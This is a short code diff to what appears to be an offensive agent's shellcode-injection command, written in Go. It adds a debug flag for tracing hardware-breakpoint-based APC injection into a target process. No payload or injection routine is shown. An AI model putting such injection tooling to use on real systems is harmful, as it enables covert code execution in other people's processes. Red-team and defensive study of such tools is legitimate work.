@@ -62,6 +62,9 @@ type ApcInjectionParams struct {
 	TargetAPI string `json:"target_api"`
 	// TimeoutMs caps the HWBP debug-event loop. Default 30000.
 	TimeoutMs uint32 `json:"timeout_ms"`
+	// HwbpDebug enables verbose tracing of the HWBP debug-event loop and
+	// per-thread DR0/DR7 readback after arming. Off by default.
+	HwbpDebug bool `json:"hwbp_debug"`
 }
 
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
@@ -126,6 +129,7 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 			PID:       uint32(params.PID),
 			TargetAPI: params.TargetAPI,
 			TimeoutMs: params.TimeoutMs,
+			Debug:     params.HwbpDebug,
 		}
 		output, err := hwbpInjectShellcode(hwbpParams)
 		if err != nil {
